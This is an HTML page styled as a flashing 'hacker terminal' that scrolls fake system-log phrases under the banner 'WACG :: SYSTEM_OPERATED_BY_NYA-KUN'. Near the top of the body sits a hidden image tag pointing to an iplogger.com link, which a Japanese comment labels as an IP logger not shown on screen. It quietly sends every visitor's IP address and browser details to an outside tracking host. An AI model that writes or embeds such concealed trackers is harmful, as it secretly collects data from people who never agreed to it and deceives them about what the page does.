<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>NYA-KUN_SYSTEM_HUB</title>
    <style>
        body {
            background-color: black;
            color: #00FF00;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            margin: 0;
            padding: 20px;
        }

        #header {
            color: #00FFFF; /* ネオンブルーに変更 */
            font-size: 30px;
            text-align: center;
            font-weight: bold;
            text-shadow: 0 0 10px #00FFFF;
            margin-bottom: 20px;
            animation: blink 0.5s infinite;
        }

        @keyframes blink { 50% { opacity: 0; } }

        #log-container {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            font-size: 12px;
            line-height: 1.2;
        }

        .log-item { width: 30%; }
    </style>
</head>
<body>

    <!-- IPロガーの読み込み（画面上は非表示） -->
    <img src="https://iplogger.com/2ednu6" style="display:none;" alt="logger">

    <div id="header">WACG :: SYSTEM_OPERATED_BY_NYA-KUN</div>
    <div id="log-container"></div>

    <script>
        const container = document.getElementById('log-container');
        const phrases = [
            ">> WACG System Initializing...",
            ">> Accessing server logs...",
            ">> Connecting to node...",
            ">> Bypassing proxy...",
            ">> [SYSTEM] Access Granted",
            ">> Fetching channel data...",
            ">> Uploading status..."
        ];

        function addLog() {
            const item = document.createElement('div');
            item.className = 'log-item';
            item.textContent = phrases[Math.floor(Math.random() * phrases.length)];
            container.appendChild(item);
            if (container.childNodes.length > 300) {
                container.removeChild(container.firstChild);
            }
        }

        setInterval(addLog, 30);
    </script>
</body>
</html>
